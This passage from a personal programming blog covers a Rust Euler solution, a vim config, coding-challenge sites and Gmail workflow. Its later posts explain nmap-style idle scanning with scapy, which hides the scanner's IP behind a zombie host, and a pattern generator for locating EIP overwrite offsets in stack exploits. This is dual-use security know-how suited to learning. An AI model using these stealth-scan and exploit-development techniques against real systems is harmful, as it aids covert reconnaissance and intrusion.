<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">fn</span><span style="color: #f8f8f2"> solve(max_num</span><span style="color: #f92672">:</span><span style="color: #f8f8f2"> </span><span style="color: #66d9ef">i32</span><span style="color: #f8f8f2">) </span><span style="color: #f92672">-&gt;</span><span style="color: #f8f8f2"> </span><span style="color: #66d9ef">i32</span><span style="color: #f8f8f2"> {</span>
<span style="color: #f8f8f2">    </span><span style="color: #66d9ef">let</span><span style="color: #f8f8f2"> numbers </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> range(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">, max_num).filter(</span><span style="color: #f92672">|</span><span style="color: #f8f8f2">i</span><span style="color: #f92672">|</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">*</span><span style="color: #f8f8f2">i </span><span style="color: #f92672">%</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">3</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">==</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">||</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">*</span><span style="color: #f8f8f2">i </span><span style="color: #f92672">%</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">5</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">==</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">    numbers.fold(</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">, </span><span style="color: #f92672">|</span><span style="color: #f8f8f2">acc, x</span><span style="color: #f92672">|</span><span style="color: #f8f8f2"> acc </span><span style="color: #f92672">+</span><span style="color: #f8f8f2"> x)</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">fn</span><span style="color: #f8f8f2"> main() {</span>
<span style="color: #f8f8f2">    print</span><span style="color: #f92672">!</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Enter the max number: &quot;</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">    </span><span style="color: #66d9ef">let</span><span style="color: #f8f8f2"> input </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> std</span><span style="color: #f92672">::</span><span style="color: #f8f8f2">io</span><span style="color: #f92672">::</span><span style="color: #f8f8f2">stdin().read_line().ok().expect(</span><span style="color: #e6db74">&quot;Failed to read line&quot;</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">    </span><span style="color: #66d9ef">let</span><span style="color: #f8f8f2"> input_num</span><span style="color: #f92672">:</span><span style="color: #f8f8f2"> Option</span><span style="color: #f92672">&lt;</span><span style="color: #66d9ef">i32</span><span style="color: #f92672">&gt;</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> input.trim().parse();</span>
<span style="color: #f8f8f2">    </span>
<span style="color: #f8f8f2">    </span><span style="color: #66d9ef">let</span><span style="color: #f8f8f2"> num </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> </span><span style="color: #66d9ef">match</span><span style="color: #f8f8f2"> input_num {</span>
<span style="color: #f8f8f2">        Some(num) </span><span style="color: #f92672">=&gt;</span><span style="color: #f8f8f2"> num,</span>
<span style="color: #f8f8f2">        None      </span><span style="color: #f92672">=&gt;</span><span style="color: #f8f8f2"> {</span>
<span style="color: #f8f8f2">            println</span><span style="color: #f92672">!</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Please input a number!&quot;</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">            </span><span style="color: #66d9ef">return</span><span style="color: #f8f8f2">;</span>
<span style="color: #f8f8f2">        }</span>
<span style="color: #f8f8f2">    };</span>

<span style="color: #f8f8f2">    println</span><span style="color: #f92672">!</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Total sum: {}&quot;</span><span style="color: #f8f8f2">, solve(num));</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</p>

<p>Let&rsquo;s run this and see what happens:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">ninja:euler_1 unlogic$ cargo run
   Compiling euler_1 v0.0.1 (file:///work/code/rust/euler/euler_1)
/work/code/rust/euler/euler_1/src/main.rs:2:19: 2:24 warning: use of unstable item: will be replaced by range notation, #[warn(unstable)] on by default
/work/code/rust/euler/euler_1/src/main.rs:2     let numbers = range(1, max_num).filter(|i| *i % 3 == 0 || *i % 5 == 0);
                                                              ^~~~~
/work/code/rust/euler/euler_1/src/main.rs:8:34: 8:45 warning: use of unstable item, #[warn(unstable)] on by default
/work/code/rust/euler/euler_1/src/main.rs:8     let input = std::io::stdin().read_line().ok().expect(&quot;Failed to read line&quot;);
                                                                             ^~~~~~~~~~~
/work/code/rust/euler/euler_1/src/main.rs:8:17: 8:31 warning: use of unstable item, #[warn(unstable)] on by default
/work/code/rust/euler/euler_1/src/main.rs:8     let input = std::io::stdin().read_line().ok().expect(&quot;Failed to read line&quot;);
                                                            ^~~~~~~~~~~~~~
/work/code/rust/euler/euler_1/src/main.rs:9:47: 9:54 warning: use of unstable item: this method was just created, #[warn(unstable)] on by default
/work/code/rust/euler/euler_1/src/main.rs:9     let input_num: Option&lt;i32&gt; = input.trim().parse();
                                                                                          ^~~~~~~
     Running `target/euler_1`
Enter the max number: 1000
Total sum: 233168
ninja:euler_1 unlogic$
</pre></div>
</p>

<p>Some warnings about unstable calls, but it&rsquo;s an Alpha release, so what else can we expect? But the end
result is there.</p>

<p>Well that was a nice little trip into Rust land, wasn&rsquo;t it?</p>

<p>UPDATE: I posted this on <a href="https://www.reddit.com/r/rust/comments/2s9lam/just_started_playing_with_rust_heres_a_write_up/">reddit</a>
and having taken some suggestions on board, I have made some small changes:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f92672">use</span><span style="color: #f8f8f2"> std</span><span style="color: #f92672">::</span><span style="color: #f8f8f2">iter</span><span style="color: #f92672">::</span><span style="color: #f8f8f2">AdditiveIterator;</span>

<span style="color: #66d9ef">fn</span><span style="color: #f8f8f2"> solve(max_num</span><span style="color: #f92672">:</span><span style="color: #f8f8f2"> </span><span style="color: #66d9ef">i32</span><span style="color: #f8f8f2">) </span><span style="color: #f92672">-&gt;</span><span style="color: #f8f8f2"> </span><span style="color: #66d9ef">i32</span><span style="color: #f8f8f2"> {</span>
<span style="color: #f8f8f2">    </span><span style="color: #66d9ef">let</span><span style="color: #f8f8f2"> </span><span style="color: #66d9ef">mut</span><span style="color: #f8f8f2"> numbers </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> (</span><span style="color: #ae81ff">1.</span><span style="color: #f8f8f2">.max_num).filter(</span><span style="color: #f92672">|</span><span style="color: #f8f8f2">i</span><span style="color: #f92672">|</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">*</span><span style="color: #f8f8f2">i </span><span style="color: #f92672">%</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">3</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">==</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">||</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">*</span><span style="color: #f8f8f2">i </span><span style="color: #f92672">%</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">5</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">==</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">    numbers.sum()</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">fn</span><span style="color: #f8f8f2"> main() {</span>
<span style="color: #f8f8f2">    print</span><span style="color: #f92672">!</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Enter the max number: &quot;</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">    </span><span style="color: #66d9ef">let</span><span style="color: #f8f8f2"> input </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> std</span><span style="color: #f92672">::</span><span style="color: #f8f8f2">io</span><span style="color: #f92672">::</span><span style="color: #f8f8f2">stdin().read_line().ok().expect(</span><span style="color: #e6db74">&quot;Failed to read line&quot;</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">    </span><span style="color: #66d9ef">let</span><span style="color: #f8f8f2"> input_num</span><span style="color: #f92672">:</span><span style="color: #f8f8f2"> Option</span><span style="color: #f92672">&lt;</span><span style="color: #66d9ef">i32</span><span style="color: #f92672">&gt;</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> input.trim().parse();</span>
<span style="color: #f8f8f2">            </span>
<span style="color: #f8f8f2">    </span><span style="color: #66d9ef">let</span><span style="color: #f8f8f2"> num </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> </span><span style="color: #66d9ef">match</span><span style="color: #f8f8f2"> input_num {</span>
<span style="color: #f8f8f2">        Some(num) </span><span style="color: #f92672">=&gt;</span><span style="color: #f8f8f2"> num,</span>
<span style="color: #f8f8f2">        None      </span><span style="color: #f92672">=&gt;</span><span style="color: #f8f8f2"> {</span>
<span style="color: #f8f8f2">            println</span><span style="color: #f92672">!</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Please input a number!&quot;</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">            </span><span style="color: #66d9ef">return</span><span style="color: #f8f8f2">;</span>
<span style="color: #f8f8f2">        }</span>
<span style="color: #f8f8f2">    };</span>

<span style="color: #f8f8f2">    println</span><span style="color: #f92672">!</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Total sum: {}&quot;</span><span style="color: #f8f8f2">, solve(num));</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</p>

<p>Also made the code (and all future solutions) available on <a href="https://github.com/Svenito/euler_rust">Github</a></p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/01/07/vim-settings-done-better/">
        Vim settings done better
      </a>
    </h1>

    <span class="post-date">Wed, Jan 7, 2015</span>

    <p>Today we&rsquo;ll cover a nice config setup for vim that I use. I got the idea from another
blog post elsewhere and I am sorry to say I cannot locate the post right now. If you
know of it, please leave a comment below and I will add it to the post as a credit.</p>

<p>I say &lsquo;better&rsquo; rather than &lsquo;right&rsquo; because I don&rsquo;t believe there&rsquo;s necessarily a right way
to do it, only bad and better. Also, what works for one might not work for another, so
please adjust as required.</p>

<p>The main principle for this setup is a modular rc file setup, where different files
are responsible for different configurations. This way it&rsquo;s easier to find a specific
setting rather than trawling through a long <code>.vimrc</code> file. So, without further delay, here&rsquo;s
the main <code>.vimrc</code> (which we still need). The role of this file is to source all the other
files we will create later. A <a href="http://unlogic.co.uk/2013/02/08/vim-as-a-python-ide/">previous post</a>
covers some configuration options specific for Python, if you are interested.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">let</span> s:vim_home <span style="color: #f8f8f2">=</span> <span style="color: #e6db74">&#39;~/.vim/settings/&#39;</span>

<span style="color: #66d9ef">let</span> config_list <span style="color: #f8f8f2">=</span> [
  \ <span style="color: #e6db74">&#39;plugins.vim&#39;</span><span style="color: #f8f8f2">,</span>
  \ <span style="color: #e6db74">&#39;base.vim&#39;</span><span style="color: #f8f8f2">,</span>
  \ <span style="color: #e6db74">&#39;functions.vim&#39;</span><span style="color: #f8f8f2">,</span>
  \ <span style="color: #e6db74">&#39;theme.vim&#39;</span><span style="color: #f8f8f2">,</span>
  \ <span style="color: #e6db74">&#39;settings.vim&#39;</span><span style="color: #f8f8f2">,</span>
  \ <span style="color: #e6db74">&#39;leader.vim&#39;</span><span style="color: #f8f8f2">,</span>
  \ <span style="color: #e6db74">&#39;keymappings.vim&#39;</span><span style="color: #f8f8f2">,</span>
  \ <span style="color: #e6db74">&#39;languages.vim&#39;</span><span style="color: #f8f8f2">,</span>
  \ <span style="color: #e6db74">&#39;plugin_settings.vim&#39;</span>
\]

<span style="color: #66d9ef">for</span> <span style="color: #66d9ef">files</span> <span style="color: #66d9ef">in</span> config_list
  <span style="color: #66d9ef">for</span> <span style="color: #66d9ef">f</span> <span style="color: #66d9ef">in</span> split<span style="color: #f8f8f2">(</span>glob<span style="color: #f8f8f2">(</span>s:vim_home.<span style="color: #66d9ef">files</span><span style="color: #f8f8f2">),</span> <span style="color: #e6db74">&#39;\n&#39;</span><span style="color: #f8f8f2">)</span>
    exec <span style="color: #e6db74">&#39;source &#39;</span>.<span style="color: #66d9ef">f</span>
  <span style="color: #66d9ef">endfor</span>

<span style="color: #66d9ef">endfor</span>
</pre></div>


<p>You can see how we&rsquo;ll divide up responsibility here. I won&rsquo;t go into details about the
contents of each file, I will leave that up to you to decide. Basically here we set a
directory - <code>~/.vim/settings/</code> - as the root for our setting files. Then we have a list
of files which contain the configs:</p>

<ul>
<li><p><strong>plugins.vim</strong>
This contains my Vundle setup and required plugins. The reason this is first is because
Vundle needs to have specific settings set that I change.</p></li>

<li><p><strong>base.vim</strong>
Contains the basic config stuff like tab interpretation, indentation behaviour, and such.</p></li>

<li><p><strong>functions.vim</strong>
Any vim functions you have written or use go in here</p></li>

<li><p><strong>theme.vim</strong>
Theme configuration and selection</p></li>

<li><p><strong>settings.vim</strong>
I don&rsquo;t have much in here, just setting my code folding prefs, basically anything that&rsquo;s not in base</p></li>

<li><p><strong>leader.vim</strong>
Any leader customisations go in here</p></li>

<li><p><strong>keymappings.vim</strong>
Like leader, but for keymaps</p></li>

<li><p><strong>languages.vim</strong>
Any language specific settings</p></li>

<li><p><strong>plugin_settings.vim</strong>
Configurations for all plugins. You might want to split this out further if it gets big</p></li>
</ul>

<p>I&rsquo;ve been using this for a while now and am very pleased with how it works and how easy it
is now to find that specific setting that I need to tweak. No more searching through a long
.vimrc file, just go directly to a much smaller file and get back to your code much quicker.</p>

<p>Hope you find this useful too. Feel free to share any other config tips in the comments below.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/01/05/dislike/">
        [dis]like
      </a>
    </h1>

    <span class="post-date">Mon, Jan 5, 2015</span>

    

<p>Isn&rsquo;t it just like me to start a new year with a post titled &ldquo;[dis]like&rdquo;? It&rsquo;s not as bad as it sounds. I want to write about coding challenge sites and what I like and dislike about them, specifically regarding Python challenges.</p>

<h2 id="what-i-like:c115de6831872c5792ce99c89a150515">What I Like</h2>

<p>I take part in coding challenges regularily for various reasons and I get a great deal of benefit from them. Albeit some challenges are a bit contrived, they do offer some great practice in problem solving and writing clean code.</p>

<p>I recommend to anyone interesting in improving their coding skills to go to some programming challenge sites and home your skills. The problems are very varied and of different difficulties so there&rsquo;s something for everyone.</p>

<p>I frequent <a href="https://checkio.org">checkIO</a> and <a href="https://codewars.com">Codewars</a> and have even submitted some challenges to the Codewars site. The benefit of attempting to solve the challenges is one thing, but to me the best return is from reading other people&rsquo;s solutions. Solving a problem one way, and then seeing how someone else solved it is very interesting and great learning experience.</p>

<p>But this is also where the trouble begins.</p>

<h2 id="what-i-dislike:c115de6831872c5792ce99c89a150515">What I Dislike</h2>

<p>Let me begin by going over some parts of the <a href="https://www.python.org/dev/peps/pep-0020/">PEP20</a></p>

<blockquote>
<ul>
<li>Readability counts.</li>
<li>Special cases aren&rsquo;t special enough to break the rules.</li>
<li>Although practicality beats purity.</li>
<li>Errors should never pass silently.</li>
<li>Unless explicitly silenced.</li>
<li>In the face of ambiguity, refuse the temptation to guess.</li>
<li>There should be one&ndash; and preferably only one &ndash;obvious way to do it.</li>
<li>Although that way may not be obvious at first unless you&rsquo;re Dutch.</li>
</ul>
</blockquote>

<p>In this case I want to refer to <em>There should be one&ndash; and preferably only one &ndash;obvious way to do it.</em>
I admit, this is ambiguous for a good reason. What is this <em>obvious</em> way? Taking the rest of the PEP20
into account we can sort of gleen a definition for this, but it&rsquo;s still open to interpretation by the
developer. So what&rsquo;s my issue here? Head over to one of these sites and look at a list of submitted solutions.
You get a lot of variety, some clever, some clear, some long, some short. A whole mixture of ways of doing it.
To me this goes against the whole Python way of <em>only one way</em>. Sure, there&rsquo;s a wrong and a right, or to be more
precise, a bad, good and a better way to complete the task.</p>

<p>The sites will let people vote on solutions that other developers like or think are best. I however don&rsquo;t always
agree with the general concensus. Sometimes I look at the top few solutions, and while clever, and quite pythonic in
certain ways, they are often not very clear. <em>Readability counts</em>. Of course you are clever and can make use
of some of Python&rsquo;s awesome features and libraries, but not everyone you are going to be working with is going to
be that clever, or that well versed in Python.</p>

<p>This is what matters to me. I look for readable code, because in a shared development environment you cannot rely on
the original developer to be around forever. One day they will leave and their smarts will go with them.
Then the slightly more elaborate code will be easier for the next person to pick up and the smart code will be left
to degrade and possibly be re-written. While you might think that the next developer will love your smart and
cryptic one-liners, they are most likely cursing your name. Consider having to debug someone else&rsquo;s
regular expression.</p>

<p>I don&rsquo;t mean that <em>all</em> top posts are bad, not by a long run. I have seen some very nice, elegant solutions in the top
3 voted posts, but a lot of the time people tend to reward cleverness over clarity or maintainability. Of course
in a programming challenge game that&rsquo;s ok, I guess it&rsquo;s part of the game, but outside of this, I look for different
values. CheckIO has a nice feature where solutions can be divided into different categories: clear, creative, speedy,
and uncategorised. I find that people on Codewars tend to favour the less readable (to me) solutions.</p>

<p>I&rsquo;ll give you an example from CheckIO&rsquo;s &ldquo;Weak Point&rdquo; challenge. The aim was to calculate the sum of
each column and row of a matrix and return the row, column with the lowest sum. The top clear answer is this:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">def</span> <span style="color: #a6e22e">weak_point</span><span style="color: #f8f8f2">(matrix):</span>
    <span style="color: #f8f8f2">n</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">len(matrix)</span>
    <span style="color: #f8f8f2">row</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">min(range(n),</span> <span style="color: #f8f8f2">key</span><span style="color: #f92672">=</span><span style="color: #66d9ef">lambda</span> <span style="color: #f8f8f2">r:sum(matrix[r][c]</span> <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">c</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">range(n)))</span>
    <span style="color: #f8f8f2">col</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">min(range(n),</span> <span style="color: #f8f8f2">key</span><span style="color: #f92672">=</span><span style="color: #66d9ef">lambda</span> <span style="color: #f8f8f2">c:sum(matrix[r][c]</span> <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">r</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">range(n)))</span>
    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">row,</span> <span style="color: #f8f8f2">col</span>
</pre></div>


<p>I like this. It&rsquo;s concise, makes use of some handy Python features and is readable. However, compare to this:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">def</span> <span style="color: #a6e22e">weak_point</span><span style="color: #f8f8f2">(matrix):</span>
    <span style="color: #f8f8f2">rows,</span> <span style="color: #f8f8f2">cols</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">map(sum,</span> <span style="color: #f8f8f2">matrix),</span> <span style="color: #f8f8f2">map(sum,</span> <span style="color: #f8f8f2">zip(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">matrix))</span>
    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">rows</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">index(min(rows)),</span> <span style="color: #f8f8f2">cols</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">index(min(cols))</span>
</pre></div>
</p>

<p>This is the second most popular answer, and I would prefer this over the top one. To me this is more readable
and easier to understand. There are fewer nested conditionals and statements, and it makes sense (assuming you
understand how <code>map</code> and <code>zip</code> work).
Granted, this is my opinion and that doesn&rsquo;t mean anyone who voted for the other answer is wrong,
I am merely trying to say that if there is one way to do it, then how come there are so many ways to do it, and
most of them don&rsquo;t seem wrong? Should we also go for cleverness over maintainability and clarity? Perhaps I
am expecting the wrong thing from challenge site submissions.</p>

<h2 id="summary-tl-dr:c115de6831872c5792ce99c89a150515">Summary (TL;DR)</h2>

<p>Programming challenge sites are great for improving your skills but be careful about learning how to be too
clever. Being clever on your own and on challenge sites is great practice, but isn&rsquo;t always the best way
to solve an issue on a project that is or will me maintained by other people who you may
never get to talk to and explain your code to. But perhaps I&rsquo;m just not as good at reading Python anymore.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2014/10/29/checking-in/">
        Checking in
      </a>
    </h1>

    <span class="post-date">Wed, Oct 29, 2014</span>

    <p>Just wanted to write a post to indicate that I am still around and also write about
something: How I use Gmail as my to-do list.</p>

<p>I&rsquo;m not usually one to write about things like this, because I personally don&rsquo;t
think they are that special, but after having a number of people marvel at
my Gmail inbox, I decided that I might as well write it down to share with anyone
else who might be interested.</p>

<p>As you well know Gmail has an inbox where all your mail comes in. From what I see
this is where most people keep their mail and that&rsquo;s fine. However I get mail
that needs to be actioned. Be that a renewal, or a shipping notification that I
need to keep around until my item arrives, or even just a reply to a personal mail.</p>

<p>I&rsquo;ve used to-do managers like Any.do but they add overhead to the the process, so
I&rsquo;ve managed to stream line the process using the archive function. It basically goes
like this:</p>

<ul>
<li>Anything I don&rsquo;t care about gets deleted straight away.</li>
<li>If it&rsquo;s something important that I need to keep I can add a label or star and
archive it.</li>
<li>If I need to action it (reply, visit a site etc) it stays in my inbox</li>
<li>If it&rsquo;s a shipping notification/receipt I keep it in the inbox until I have the item
and am happy with it. This serves two purposes 1) it reminds me what I am expecting
and 2) lets me find the invoice quickly in case of returns</li>
<li>Once I have actioned an item it gets archived.</li>
</ul>

<p>This way I have an empty inbox bar items that I actually care about. This adds
very little overhead in terms of keeping track of things that need to be done.</p>

<p>Sure, this won&rsquo;t work if you need a reminder to get something done at 10am, but
I find we live in our inboxes so much that generally you will see these prompts
more often than you think. The added bonus is that you don&rsquo;t have a massive cluttered
inbox and important items are never far away.</p>

<p>I&rsquo;m sure that it doesn&rsquo;t replace a fully fledged to-do list/reminder app, but
it does the job very well for me, and getting my inbox zerod out is even more of
a push to take care of things. Plus you are never really going to be in a position
where you simply forgot to reply because you thought you already had done so. Or
you forgot to reply because you lost the email in the huge list of other mail you
have sitting in your inbox.</p>

<p>I am curious to see how Google&rsquo;s new Inbox will work for me, but right now I am
still waiting on my invite.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2014/08/08/why-it-will-be-quiet/">
        Why it will be quiet
      </a>
    </h1>

    <span class="post-date">Fri, Aug 8, 2014</span>

    <p>If you are reading this in the <a href="http://i.imgur.com/pQSJhyw.png">future</a> you might
be wondering why the posts are so old and why there are no recent ones.
The simple reason is that I have had nothing to add. &ldquo;But how did you
know this?&rdquo; you ask. Well, I decided so. I&rsquo;ve not been very good at adding
content recently, for the simple reason that I have nothing much to write about.</p>

<p>You see it&rsquo;s quite simple really: I&rsquo;m taking a step back from it all. I have a
full time job and a family. Both these things are time consuming and that
leaves little time for me to tinker, hack, code, write whatever. So I&rsquo;ve decided
that rather than shoe horn in half-assed attempts, I&rsquo;d rather just take a step
back. Going by the simple idion of
<a href="http://i.imgur.com/8maeRT0.jpg">&ldquo;Anything worth doing, is worth doing right&rdquo;</a>. That doesn&rsquo;t mean I will be giving up coding, hacking, whatever,
completely, it just means I will be working on things that aren&rsquo;t really worth
writing about or that have already been written about a hundered times over.
Thus I will have little or nothing new to add to what is already available <a href="http://www.google.com">out
there</a>.</p>

<p>I could write about things from work, but the nature of my work doesn&rsquo;t really
<a href="http://i.imgur.com/ugA8LLd.gif">allow for that</a>.
I don&rsquo;t want to write about opinions and thoughts, because that&rsquo;s
not what I am about. I&rsquo;ve tried it before and I didn&rsquo;t enjoy it, nor was I
<a href="https://i.imgur.com/Ut25SPN.gif">happy with the result</a>.
So with this I will leave what is here for your reference and who knows,
maybe one day there will be another post about something or other.</p>

<p>Time to kickback and <a href="http://i.imgur.com/rSxyNlO.gif">have a beer</a> methinks.</p>

<p>Thanks for reading<a href="https://i.imgur.com/vG96Num.gif">.</a></p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2014/07/17/nmaps-idle-scan-with-scapy/">
        nmap&#39;s idle scan with scapy
      </a>
    </h1>

    <span class="post-date">Thu, Jul 17, 2014</span>

    <p>If you&rsquo;ve used nmap before you are probably familiar with its idle scan feature.
Should you not be, go and <a href="http://nmap.org/book/idlescan.html">skim the docs</a>.
I&rsquo;ll quickly cover the basics here anyway.</p>

<p>Basically it will allow us to conduct a port scan of a remote host without revealing
our IP address. This is done by making use of the fact that IP IDs are sequential.
The images below (courtesy of the namp project documentation) explain this very
well.</p>

<p><strong>Open Port</strong>
<a href="http://i.imgur.com/MajmRTH.png">
<figure >
    
        <img src="http://i.imgur.com/MajmRTH.png" />
    
    
</figure>
</a></p>

<p><strong>Closed Port</strong>
<a href="http://i.imgur.com/2UALzzd.png">
<figure >
    
        <img src="http://i.imgur.com/2UALzzd.png" />
    
    
</figure>
</a></p>

<p><strong>Filtered Port</strong>
<a href="http://i.imgur.com/Yv6hbwL.png">
<figure >
    
        <img src="http://i.imgur.com/Yv6hbwL.png" />
    
    
</figure>
</a></p>

<p>Ok, so that&rsquo;s the short version of the theory and it&rsquo;s relatively painless
to implement with scapy. Let&rsquo;s take a look at the script:</p>

<p>{% gist e377713b90525e842266 %}</p>

<p>You provide the script with a <code>zombie ip</code>, <code>target ip</code>, and <code>target port</code>.
These should be self explanatory. Then we use scapy to assemble our packets to
conduct our scan. The <code>p1</code> SYN/ACK packet will be sent to the zombie so we can
obtain a current IP ID from the RST response as a reference.</p>

<p><code>p2</code> is a SYN packet which we send to the target with a return address of the
zombie host. When the target receives this packet it will reply to
the zombie instead of the source machine (us). The target will respond with a
SYN/ACK to the <code>p2</code> packet, but send its response to the zombie instead of us.
Thus increasing the zobmies IP ID value by one.</p>

<p>Then we probe the zombie again with a further SYN/ACK packet (this is <code>p3</code>) to
find out what the new IP ID is.</p>

<p>Now we have enough information to determine if the remote port is open or not.
We subtract the initial IP ID from the final one and print out the status of the port.</p>

<p>So how do you use it? The important thing is to find a relative inactive machine to
use as a zombie, as you don&rsquo;t want the IP ID to change while you are conducting
your probe. I&rsquo;ve had the best results with using networked printers as zombie hosts.
Unless there&rsquo;s a lot of print jobs going on, they are fairly idle. The printer
is at <code>10.20.7.1</code> and I&rsquo;m probing port 80 on <code>10.16.70.8</code>.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">$<span style="color: #f92672">]</span> sudo ./idle_scan.py 10.20.7.1 0.16.70.8 80
WARNING: No route found for IPv6 destination :: (no default route?)

[*] Scan 10.16.70.8 port 80 using 10.20.7.1 as zombie
[+] Zombie initial IP id 57319
[+] Zombie final IP id 57321
[+] Port 80 : open

sudo ./idle_scan.py 10.20.7.1 0.16.70.8 90
WARNING: No route found for IPv6 destination :: (no default route?)

[*] Scan 10.16.70.8 port 90 using 10.20.7.1 as zombie
[+] Zombie initial IP id 57341
[+] Zombie final IP id 57342
[+] Port 90 : closed
 
</pre></div>
</p>

<p>And to be sure, let&rsquo;s verify our findings with a proper nmap scan.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">$<span style="color: #f92672">]</span> nmap 10.16.70.8 -p80,90

Starting Nmap 5.51 ( http://nmap.org ) at 2014-07-17 13:07 BST
Nmap scan report for 10.16.70.8 (10.16.70.8)
Host is up (0.00013s latency).
PORT   STATE  SERVICE
80/tcp open   http
90/tcp closed dnsix

Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds
</pre></div>
</p>

<p>Approved.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2014/07/16/exploit-pattern-generator/">
        Exploit pattern generator
      </a>
    </h1>

    <span class="post-date">Wed, Jul 16, 2014</span>

    <p>I&rsquo;ve been playing around with various stack exploits and have made a fair bit
of use of metasploit&rsquo;s pattern generation and search tools in order to find
EIP overwrite locations in an overflow string. This works very well indeed,
but I had a couple of issues: Firstly I had to have my Kali (or whatever
pentest distro) VM running. Secondly running the scripts was very slow. Go on
give them a go.</p>

<p>I was told about <a href="https://github.com/longld/peda">peda</a> which is a
Python Exploit Development Assistance for GDB. This is great, but I am playing
some war games on either virtual machines or remote boxes where I can&rsquo;t install
things like this. And I didn&rsquo;t want to have to copy binaries around all the time
either. So I looked for some alternatives. There were (unsurprisingly) quite
a few, but they were in Perl or Ruby. I was seeking a Python implementation.</p>

<p><a href="https://github.com/Svenito/exploit-pattern">So I rolled my own</a></p>

<p>It will generate a pattern exactly like the Metasploit one up to a maximum of
20280 characters in length. Usage is dead simple. To generate a pattern just
supply the desired length:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">$&gt; pattern.py 100
Aa0Aa0Aa1Aa1Aa2Aa2Aa3Aa3Aa4Aa4Aa5Aa5Aa6Aa6Aa7Aa7Aa8Aa8Aa9Aa9Ab0Ab0Ab1Ab1Ab2Ab
2Ab3Ab3Ab4Ab4Ab5Ab5Ab6A
</pre></div>


<p>And to search for a pattern:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">$&gt; pattern.py Bf4
Pattern Bf4 first occurrence at position 942 in pattern.
$&gt; pattern.py Bf4B
Pattern Bf4B first occurrence at position 942 in pattern.
$&gt; pattern.py 0x42346642
Pattern 0x42346642 first occurrence at position 942 in pattern.
</pre></div>


<p>As you can see it converts the hex representation to the correct pattern. The
